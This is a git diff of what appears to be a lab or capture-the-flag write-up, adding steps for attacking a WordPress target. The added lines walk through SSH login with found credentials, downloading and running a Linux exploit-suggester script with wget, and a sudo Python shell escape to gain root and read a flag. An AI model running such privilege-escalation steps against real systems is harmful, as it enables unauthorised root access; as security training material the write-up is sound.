@@ -98,8 +98,13 @@ Before we began, we ran an enumeration scan to uncover the users and hidden dire
 
 ![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/steven%20password%20pink84.png)
 
--> logged in with steven’s credentials and then ran bin/bash command  to gain root
-   - ssh steven@192.168.1.110 -> sudo /usr/bin/python -> import os -> os.system(‘ /bin/bash’) -> ls -> cat flag4.txt
+-> logged in with steven’s credentials ->ssh steven@192.168.1.110 -> by entering sudo -l I was able to determine I could utilize python while logged in as steven via usr/bin/python.  This would also allow some priveledge escalation.  From there I accessed the tmp file with cd ~/tmp.  I then ran a wget command to obtain the exploit I wanted to use.  wget https://raw.githubusercontent.com/mzet-/linux.exploit-suggester/master/linux-exploit-suggester.sh.  Once the download was completed I entered ls to ensure the exploit was there les.sh was visible.  I then needed to update permissions to run the command by entering chmod 775 les.sh.  I then ran the command with ./les.sh.  This gave me the potential exploits to utilize.  
+I then entered the following commands:
+   - sudo /usr/bin/python -> import os -> os.system(‘ /bin/bash’) 
+   - This allowed me to gain root access.
+   - Once logged in I used the command cd ~/root -> ls -> cat flag4.txt
+
+![TODO:](html)
 
 Target 2
 - flag1.txt: a2c1f66d2b8051bd3a5874b5b6e43e21
